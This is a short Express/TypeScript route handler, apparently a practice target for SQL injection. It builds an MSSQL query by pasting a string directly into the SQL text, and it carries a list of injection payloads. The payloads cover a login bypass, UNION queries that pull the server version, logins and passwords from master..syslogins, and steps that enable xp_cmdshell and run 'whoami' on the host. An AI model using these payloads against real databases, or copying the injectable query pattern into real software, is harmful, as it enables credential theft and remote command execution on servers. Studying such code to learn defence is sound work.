// Node imports
import { Request, Response } from 'express';
import * as mssql from 'mssql';

// App imports
import { mssqlConfig } from '../../config/mssql';

/**
 * GET /search
 * Search the names of registered users.
 */
export const getSearch = (req: Request, res: Response) => {
    const username: string = req.query.username;
    // const username: string = "' OR 1=1 --";
    // const test: string = "' UNION SELECT @@VERSION,2,3,4,5,6 --";
    // const test: string = "' UNION SELECT name,2,3,4,5,6 FROM master..syslogins --";
    // const test: string = "' UNION SELECT DB_NAME(),password,3,4,5,6 --";
    // const test: string = "' UNION SELECT HOST_NAME(),2,3,4,5,6 --";

    // SHELLZ
    // const test: string = "'; EXEC sp_configure 'show advanced options', 1;--";
    // const test: string = "'; RECONFIGURE;--";
    // const test: string = "'; EXEC sp_configure 'xp_cmdshell', 1;--";
    // const test: string = "'; RECONFIGURE;--";
    const test: string = "'; EXEC xp_cmdshell 'whoami';--";

    // Set up a connection
    var connection = new mssql.ConnectionPool(mssqlConfig);

    // Connect and submit the query
    connection.connect().then((pool: mssql.ConnectionPool) => {
        var req = new mssql.Request(pool);
        req.query(`SELECT * from dbo.users WHERE username LIKE '${test}'`).then(function (recordset: mssql.IResult<any>) {
            console.log(recordset);
            res.send(recordset.recordsets)
            connection.close();
        }).catch(function (err) {
            console.log(err);
            connection.close();
        });
    }).catch(function (err) {
        console.log(err);
    });

};
